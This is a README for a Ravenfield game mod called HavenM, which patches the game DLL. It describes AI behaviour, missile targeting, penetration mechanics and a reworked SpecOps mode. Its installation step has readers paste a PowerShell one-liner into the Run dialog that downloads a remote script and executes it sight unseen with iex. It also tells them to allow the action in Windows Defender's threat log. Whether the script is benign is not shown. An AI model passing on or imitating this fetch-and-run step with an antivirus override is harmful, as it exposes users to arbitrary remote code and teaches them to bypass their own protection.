# HavenM - AI and Gameplay Overhaul for Ravenfield

## What is HavenM?
HavenM is a game-changing AI and gameplay overhaul mod for *Ravenfield*, designed to enhance immersion, realism, and challenge. By modifying the game's DLL using *dnSpy*, this mod pushes AI behavior and game mechanics far beyond the vanilla experience.

## Why Modify the Game DLL with dnSpy?
Ravenfield's default AI often feels too predictable, lacking the tactical decision-making and combat awareness that could make battles more engaging. Over nearly two years of dedicated work, HavenM was created to introduce smarter, more reactive AI and refined game mechanics, offering a significantly improved experience.

## Key Features & Changes

### AI Improvements
- **Tactical Movement & Reactions**
  - AI soldiers go **prone under fire**, making them harder to hit.
  - AI no longer **auto-crouches** but instead jogs to objectives when not under fire, improving pacing and movement fluidity.
  - AI **halts vehicles to fire weapons**, with behavior influenced by skill level and weapon type.
  - AI **stops, aims, fires, and tracks targets** when using wire-guided missile weapons, greatly enhancing anti-vehicle effectiveness.
  - AI **exits vehicles when submerged** in water and leaves aircraft when stuck, preventing soft-lock situations.
  
- **Combat Behavior & Engagements**
  - AI **fires more aggressively**, reducing hesitation and making firefights more intense.
  - AI from **all skill levels can lean**.
  - AI **hides behind cover when under fire**.
  - AI **provides suppressive fire** on known enemy positions.
  - AI **prioritizes high-threat targets** like mortar teams rather than engaging randomly.
  - AI **engages low-flying and slow-moving aircraft**, making landing helicopters and air support more vulnerable.
  - AI **randomizes weapon switching** based on target engagement effectiveness, preventing predictable behavior.
  - AI **switches between grenades, under-barrel grenade launchers, and melee weapons** when appropriate.
  - Vehicles with **low passenger counts halt more often to provide fire support** instead of recklessly rushing into battle.
  - **Airplanes perform better** in air-to-ground attacks, adjusting tactics based on weapon loadout.
  - AI **driving vehicles now reverse based on their actual reverse speed**, reducing vehicle-stuck issues (e.g., T-72 tank).
  - AI **loadouts are randomized**.
  - AI **no longer drops their target** in SpecOps mode or when within **40m of an enemy**.
  - AI **panic fires when an enemy is within 20m**, ignoring weapon effectiveness (works well with kamikaze vehicle mods).
  - AI **piloting helicopters slows down and stabilizes** when spotting an enemy while using wire-guided missiles, improving targeting accuracy.
  - AI **grouped near cover is now considered an infantry group**, allowing explosives to target them effectively.

### New Game Mechanics
- **Weapon Mounting System**
  - Inspired by *Rising Storm: Vietnam*, players can now mount weapons on surfaces for improved accuracy and stability.

- **Advanced Missile Targeting**
  - Missiles **predict target movement** instead of flying straight, making dogfights and anti-vehicle combat more challenging.
  - Flares **don't stop missile locks**, but they confuse missiles, causing them to veer off unpredictably instead of always missing.

- **Simple Penetration System**
  - High-damage weapons now have penetration mechanics:
    - **Bullets & explosives pass through cover** if they deal **over 100 damage**.
    - **Explosives ignore cover & explode** if their damage is over **900**.

## Overhauled SpecOps Game Mode
HavenM includes a **complete revamp** of the SpecOps mode, making it more dynamic and challenging:

- **Dynamic enemy spawns**, ensuring unpredictable encounters.
- **Customizable objectives & enemy count**, allowing for tailored difficulty (bot number controls AI per objective, respawn timer controls objective count).
- AI **exits vehicles** when the player is nearby to engage in direct combat.
- AI **flanks and ambushes players** based on skill level.
  - **Normal & lower-skill bots** rush to the player's last known position.
  - **Veteran bots** hold back, providing fire support and ambushing players who move carelessly.
- **Increased enemy spawns during exfiltration**, making the escape phase more intense.
- AI **no longer needs direct line of sight to fire flares**—they react when alerted instead.

# Installation 
Copy this command, Win+R to open "Run" windows, paste it, and press Enter.

It will create an Updater shortcut in Desktop.

**YOU MAY NEED TO ALLOW THIS ACTION ON YOUR [WINDOWS DENFENDER](windowsdefender://threat)’s Log FOR THE FIRST TIME!!!**
```batch
powershell -nop -c "$w=(New-Object System.Net.WebClient);$w.Encoding=[System.Text.Encoding]::UTF8;iex($w.DownloadString('http://ravenfieldcommunity.github.io/static/get_havenm-utf8.ps1'));Read-Host;"
```
